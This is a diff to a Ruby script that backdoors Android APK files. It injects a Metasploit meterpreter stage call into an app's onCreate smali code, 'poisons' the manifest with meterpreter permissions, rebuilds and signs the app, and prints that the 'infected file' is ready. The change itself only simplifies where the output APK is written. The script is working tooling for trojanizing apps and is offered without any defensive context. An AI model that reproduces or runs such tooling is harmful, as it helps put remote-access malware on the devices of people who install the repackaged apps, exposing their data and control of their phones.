@@ -230,18 +230,16 @@ payloadhook = activitycreate + "\n    invoke-static {p0}, Lcom/metasploit/stage/
 hookedsmali = activitysmali.gsub(activitycreate, payloadhook)
 print "[*] Loading ",smalifile," and injecting payload..\n"
 File.open(smalifile, "w") {|file| file.puts hookedsmali }
-injected_apk=apkfile.split(".")[0]
-injected_apk+="_backdoored.apk"
+injected_apk=apkfile.split(".")[0] + "_backdoored.apk"
 
 print "[*] Poisoning the manifest with meterpreter permissions..\n"
 fix_manifest(tempdir)
 
 print "[*] Rebuilding #{apkfile} with meterpreter injection as #{injected_apk}..\n"
-run_cmd("apktool b -o #{tempdir}/#{injected_apk} #{tempdir}/original")
+run_cmd("apktool b -o #{injected_apk} #{tempdir}/original")
 print "[*] Signing #{injected_apk} ..\n"                                                                                               
-run_cmd("jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA #{tempdir}/#{injected_apk} androiddebugkey")
+run_cmd("jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA #{injected_apk} androiddebugkey")
 
-run_cmd("cp #{tempdir}/#{injected_apk} .")
 FileUtils.remove_entry tempdir
 
 puts "[+] Infected file #{injected_apk} ready.\n"
